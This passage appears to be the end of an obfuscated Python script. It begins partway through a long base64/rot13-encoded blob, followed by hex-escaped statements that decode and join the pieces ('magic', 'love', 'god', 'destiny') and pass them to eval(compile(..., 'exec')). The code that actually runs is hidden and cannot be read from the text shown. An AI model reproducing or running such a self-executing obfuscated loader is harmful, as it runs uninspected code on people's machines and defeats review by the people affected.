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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))